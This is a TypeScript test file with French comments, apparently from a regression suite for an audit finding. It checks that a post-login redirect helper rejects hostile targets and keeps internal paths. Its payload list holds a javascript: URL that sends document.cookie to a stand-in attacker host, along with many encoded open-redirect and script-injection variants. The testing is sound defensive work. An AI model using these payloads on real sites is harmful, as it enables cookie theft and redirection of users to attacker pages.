/**
 * Lot 9 quater (A1 : AUD-17 CRITIQUE, G-03) — destination après connexion ou inscription.
 *
 * Une seule fonction de nettoyage (lib/auth/safe-redirect.ts, safeInternalPath) : seul un chemin interne du site est
 * suivi ; toute autre valeur (schéma, « // », « /\ », caractère de contrôle, forme encodée de l'un d'eux) donne
 * l'espace du compte. Contrôles :
 *  1. les charges de tests/audit/aud-17 et leurs variantes encodées, pour chaque rôle, par resolvePostLoginRoute ;
 *  2. safeInternalPath sur les mêmes charges, et les chemins internes légitimes conservés ;
 *  3. lecture du code : chaque lecteur de `redirect`, `next` ou `returnTo` passe par safeInternalPath, et aucune
 *     affectation de window.location ne reçoit la valeur brute.
 * Sans base. Rouge avant correctif : lib/auth/safe-redirect.ts n'existe pas, resolvePostLoginRoute rend la cible brute.
 */
import '../helpers/env';
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { resolvePostLoginRoute } from '../../lib/auth/resolve-post-login-route';

const ROOT = process.cwd();

/** Charges de l'audit (tests/audit/aud-17-redirection-connexion.test.ts:19-25), recopiées. */
const AUDIT_PAYLOADS = [
    'javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))',
    'JavaScript:alert(document.domain)',
    'https://attaquant.example/connexion',
    '//attaquant.example/connexion',
    '/\\attaquant.example',
];

/** Variantes : schémas, encodages simples et doubles, caractères de contrôle, espaces, barres inverses. */
const VARIANTS = [
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'http://attaquant.example',
    '  javascript:alert(1)',
    '\tjavascript:alert(1)',
    'java\tscript:alert(1)',
    '/\t/attaquant.example',
    '/\n/attaquant.example',
    '/\r/attaquant.example',
    '/\u0000/attaquant.example',
    '\\\\attaquant.example',
    '/\\/attaquant.example',
    '%2F%2Fattaquant.example',
    '/%2Fattaquant.example',
    '/%2fattaquant.example',
    '/%5Cattaquant.example',
    '/%5cattaquant.example',
    '/%09/attaquant.example',
    '/%0A/attaquant.example',
    '/%252F%252Fattaquant.example',
    '/%25252F%25252Fattaquant.example',
    '%2F%5Cattaquant.example',
    'javascript%3Aalert(1)',
    '/%E2%80%A8/attaquant.example',
    'https:attaquant.example',
    '///attaquant.example',
    '',
    '   ',
];

const HOSTILE = [...AUDIT_PAYLOADS, ...VARIANTS];

const ROLE_SETS: string[][] = [[], ['CLIENT'], ['PARTENAIRE'], ['CONTROLEUR'], ['ADMIN'], ['SUPERADMIN']];

const ACCOUNT_SPACES = new Set(['/', '/admin', '/partner', '/controller/scanner']);

describe('A1 — destination après connexion : chemin interne ou espace du compte', () => {
    test('chaque charge hostile, pour chaque rôle, donne l\'espace du compte', () => {
        const bad: string[] = [];
        for (const raw of HOSTILE) {
            for (const roles of ROLE_SETS) {
                const target = resolvePostLoginRoute(roles, raw);
                if (!ACCOUNT_SPACES.has(target)) bad.push(`${roles.join(',') || '(aucun)'} ${JSON.stringify(raw)} → ${JSON.stringify(target)}`);
            }
        }
        console.log(`[A1] ${HOSTILE.length} charges × ${ROLE_SETS.length} jeux de rôles ; destinations hors espace du compte : ${bad.length}`);
        assert.deepEqual(bad, [], `destinations hostiles suivies :\n${bad.join('\n')}`);
    });

    test('safeInternalPath refuse chaque charge et garde les chemins internes', async () => {
        const modPath = path.join(ROOT, 'lib/auth/safe-redirect.ts');
        assert.ok(fs.existsSync(modPath), 'lib/auth/safe-redirect.ts absent : aucune fonction commune de nettoyage');
        const { safeInternalPath } = await import('../../lib/auth/safe-redirect');
        const accepted = HOSTILE.filter((raw) => safeInternalPath(raw) !== null);
        assert.deepEqual(accepted, [], `charges acceptées : ${JSON.stringify(accepted)}`);
        const legit = ['/events/abc', '/tickets', '/paiement/123?x=1', '/profile/notifications', '/events/a%20b', '/partner/events#top', '/'];
        for (const p of legit) assert.equal(safeInternalPath(p), p, `chemin interne refusé à tort : ${p}`);
        assert.equal(safeInternalPath('  /tickets  '), '/tickets', 'espaces de bord retirés');
        assert.equal(safeInternalPath(null), null);
        assert.equal(safeInternalPath(undefined), null);
    });

    test('chemins internes conservés par resolvePostLoginRoute, cas du contrôleur inchangé', () => {
        assert.equal(resolvePostLoginRoute(['CLIENT'], '/events/abc'), '/events/abc');
        assert.equal(resolvePostLoginRoute(['ADMIN'], '/admin/users'), '/admin/users');
        assert.equal(resolvePostLoginRoute(['CONTROLEUR'], '/scan'), '/controller/scanner');
        assert.equal(resolvePostLoginRoute(['CONTROLEUR'], '/partner/scan'), '/controller/scanner');
        assert.equal(resolvePostLoginRoute(['PARTENAIRE'], '/'), '/partner');
        assert.equal(resolvePostLoginRoute(['ADMIN'], null), '/admin');
    });
});

/** Fichiers .ts/.tsx de app, components, lib, hooks et middleware.ts (hors safe-redirect.ts). */
function sourceFiles(): string[] {
    const out: string[] = [];
    const walk = (dir: string) => {
        if (!fs.existsSync(dir)) return;
        for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
            const full = path.join(dir, e.name);
            if (e.isDirectory()) walk(full);
            else if (/\.(ts|tsx)$/.test(e.name)) out.push(full);
        }
    };
    for (const d of ['app', 'components', 'lib', 'hooks']) walk(path.join(ROOT, d));
    out.push(path.join(ROOT, 'middleware.ts'));
    return out.filter((f) => !f.endsWith(path.join('lib', 'auth', 'safe-redirect.ts')));
}

describe('A1 — lecture du code : tout lecteur de redirect, next ou returnTo passe par safeInternalPath', () => {
    test('aucun lecteur brut du paramètre, aucune affectation brute de window.location', () => {
        const READ = /(?:searchParams|params)\??\.(?:get\(\s*['"](?:redirect|next|returnTo|redirectTo)['"]\s*\)|(?:redirect|next|returnTo|redirectTo)\b)/;
        const offenders: string[] = [];
        for (const file of sourceFiles()) {
            const lines = fs.readFileSync(file, 'utf8').split(/\r?\n/);
            lines.forEach((line, i) => {
                if (READ.test(line) && !line.includes('safeInternalPath(')) {
                    offenders.push(`${path.relative(ROOT, file)}:${i + 1} lecture sans safeInternalPath : ${line.trim()}`);
                }
                // Valeur brute du paramètre affectée au navigateur. `redirectTo` de l'inscription est un état posé
                // seulement par safeInternalPath, contrôlé juste après.
                if (/window\.location(?:\.href)?\s*=\s*(?:redirectUrl|redirect|next|returnTo)\b/.test(line)) {
                    offenders.push(`${path.relative(ROOT, file)}:${i + 1} affectation brute : ${line.trim()}`);
                }
                if (/\bsetRedirectTo\(/.test(line) && !line.includes('safeInternalPath(')) {
                    offenders.push(`${path.relative(ROOT, file)}:${i + 1} état de destination posé sans safeInternalPath : ${line.trim()}`);
                }
            });
        }
        assert.deepEqual(offenders, [], offenders.join('\n'));
    });
});
